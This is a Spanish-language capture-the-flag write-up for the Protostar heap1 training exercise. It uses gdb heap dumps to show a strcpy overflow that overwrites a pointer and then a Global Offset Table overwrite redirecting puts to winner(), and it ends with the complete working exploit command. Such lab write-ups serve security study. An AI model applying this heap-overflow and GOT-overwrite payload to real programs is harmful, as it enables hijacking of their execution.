
[heap1](#https://exploit.education/protostar/heap-one/)


Para entender esto es muy importante ver como funciona el [heap]()

```console
(gdb) disas main
0x080484c9 <main+16>:   call   0x80483bc <malloc@plt>
0x080484ce <main+21>:   mov    0x14, [esp]

(gdb) b *0x080484ce # Ponemos un breakpoint despues del primer malloc
(gdb) b *0x080484e8 # Tambien otros con los otros 3 mallocs y el strcy (0x080484fd, 0x08048517, 0x0804853d, 0x0804855a)
(gdb) run AAAABBBBCCCCDDDDEEEEFFFF 0000111122223333
(gdb) info proc map   
         0x804a000  0x806b000    0x21000          0           [heap]   # El heap está en  0x804a000

(gdb) define hook-stop
>x/64wx 0x804a000  # Vamos a observar como va evolucionando el heap
>end

# Primer malloc c9 -> ce
0x804a000:      0x00000000      0x00000011      0x00000000      0x00000000
0x804a010:      0x00000000      0x00020ff1      0x00000000      0x00000000

# Segundo malloc e3 -> e8
0x804a000:      0x00000000      0x00000011      0x00000001      0x00000000
0x804a010:      0x00000000      0x00000011      0x00000000      0x00000000
0x804a020:      0x00000000      0x00020fe1      0x00000000      0x00000000

(gdb) set $i1 = (struct internet*)0x804a008   # Tambien observaremos el struct u objeto "internet"

# Tercer malloc f8 -> fd
0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
0x804a010:      0x00000000      0x00000011      0x00000000      0x00000000
0x804a020:      0x00000000      0x00000011      0x00000000      0x00000000
0x804a030:      0x00000000      0x00020fd1      0x00000000      0x00000000

(gdb) p *$i1   # internet = {priority = 1, name = 0x804a018 ""}
 
Cuarto malloc 12 -> 17
0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
0x804a010:      0x00000000      0x00000011      0x00000000      0x00000000
0x804a020:      0x00000000      0x00000011      0x00000002      0x00000000
0x804a030:      0x00000000      0x00000011      0x00000000      0x00000000
0x804a040:      0x00000000      0x00020fc1      0x00000000      0x00000000

Strcpy 38 -> 3d
0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
0x804a010:      0x00000000      0x00000011      0x41414141      0x42424242
0x804a020:      0x43434343      0x44444444      0x45454545      0x46464646
0x804a030:      0x00000000      0x00000011      0x00000000      0x00000000
0x804a040:      0x00000000      0x00020fc1      0x00000000      0x00000000

(gdb) p *$i1 
$6 = {priority = 1, name = 0x804a018 "AAAABBBBCCCCDDDDEEEEt\227\004\b"}
```
Como se puede ver el strcpy ha empezado a escribir en  0x0804a018, pero al no acabarse (overflow), ha desbordado el chunk siguiente, en concreto el que 
correspondia al segundo objeto, la parte de nombre y que almacenaba la dirección donde se escribiría este (dada por el malloc). Por tanto colpasa con 
un SEGFAULT ya que la memoria "0x46464646" no existe (las "F")

Es decir, el primer argumento "AAAABBBBCCCCDDDDEEEEFFFF" acaba siendo "¿Donde escribir?" por ser taaan largo.

```console
(gdb) run AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII
Program received signal SIGSEGV, Segmentation fault.
*__GI_strcpy (dest=0x46464646 <Address 0x46464646 out of bounds>, src=0x0) at strcpy.c:39

(gdb) run AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII 0000111122223333
Program received signal SIGSEGV, Segmentation fault.
*__GI_strcpy (dest=0x46464646 <Address 0x46464646 out of bounds>, src=0xbffff8ad "0000111122223333") at strcpy.c:40
```
El segundo argumento por tanto es ¿que escribir? Y aquí es como podemos abusar de la Global Offset Table;
> tabla donde estan las direcciones de las funciones, las escribe una funcion del sistema, pero tambien la podemos escribir nosotros con la funcion que
> nos de la gana ejecutar en lugar de la funcion buena.

```console
[cucuxii]:$ objdump -D ./heap1
08048494 <winner>:        # -> \x94\x84\x04\x08
[cucuxii]:$ gdb ./heap1
(gdb) disas main
0x08048561 <main+168>:  call   0x80483cc <puts@plt>
(gdb) disas 0x80483cc
0x080483cc <puts@plt+0>:        jmp    *0x8049774   # -> \x74\x97\x04\x08

(gdb) run "`/bin/echo -ne "AAAABBBBCCCCDDDDEEEE\x74\x97\x04\x08"`" "`/bin/echo -ne "\x94\x84\x04\x08"`"
and we have a winner @ 1657877687   # echo -ne -> sin salto de linea y formato bytes
```


